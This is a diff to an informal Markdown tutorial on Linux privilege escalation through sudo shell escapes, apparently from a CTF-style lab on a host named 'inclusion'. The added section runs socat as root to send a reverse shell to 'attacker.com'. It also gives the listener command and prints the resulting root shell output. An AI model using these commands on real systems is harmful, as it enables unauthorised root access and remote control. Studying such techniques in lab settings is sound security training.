@@ -160,7 +160,7 @@ Now switch to the newroot user, using the new password:
              step 2: run shell escape according to your listed programs that was the result of sudo -l command 
 
 
-#### ☑️Attension Please : Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
+☑️Attension Please : Visit GTFOBins (https://gtfobins.github.io) and search for some of the program names. If the program is listed with "sudo" as a function, you can use it to elevate privileges, usually via an escape sequence.
 
 Choose a program from the list and try to gain a root shell, using the instructions from GTFOBins.
 
@@ -188,7 +188,7 @@ Choose a program from the list and try to gain a root shell, using the instructi
 
  Ok  , that's great  . Now check all listed program escape shell from GTFOBins  one by one .
 
-#### Step 2 : Go to GTFOBins (https://gtfobins.github.io)  website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )
+#### Step 2 : Go to GTFOBins website and choice escape shell according to your  sudo -l result . (Suppose  , we wanna check  (root) NOPASSWD: /usr/bin/find )
         
          GTFOBins Result :
  
@@ -206,3 +206,46 @@ Choose a program from the list and try to gain a root shell, using the instructi
      sh-4.1# 
 
 #### 😍Happy Hacking 😍
+
+# 🔥05: Root Privilegers using Shell Escape Sequences :
+Acording to Previous process we will use :sudo -l and then  check Shell Escape Sequences and check it on GFTOBins
+
+# Step 1:
+        sudo -l 
+Result :
+    
+    matching Defaults entries for falconfeast on inclusion:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+    User falconfeast may run the following commands on inclusion:
+    (root) NOPASSWD: /usr/bin/socat
+    
+# Step 2: Now check (root) NOPASSWD: /usr/bin/socat in GFTobins and use it 
+
+Here , socat is our target Shell Escape which use for connected other machine . For liseting socat we must  upload Reverse Shell on our target Machine
+Like that :
+
+    RHOST=attacker.com
+    RPORT=12345
+    sudo socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane
+OR :
+
+    sudo socat tcp-connect:my-machine ip:my-machine port number  exec:/bin/sh,pty,stderr,setsid,sigint,sane
+    
+    
+# Step 3: After  , complete those steps sucessfully   We must use following command in your  pc :
+
+        socat file:`tty`,raw,echo=0 tcp-listen:12345
+        
+
+If we successfully complete all those steps we get root power of target machine like that :
+
+    socat file:`tty`,raw,echo=0 tcp-listen:12345
+    /bin/sh: 0: can't access tty; job control turned off
+    #id
+    uid=0(root) gid=0(root) groups=0(root)
+    #whoami
+    root
+
+#### 😍Happy Hacking 😍
+    
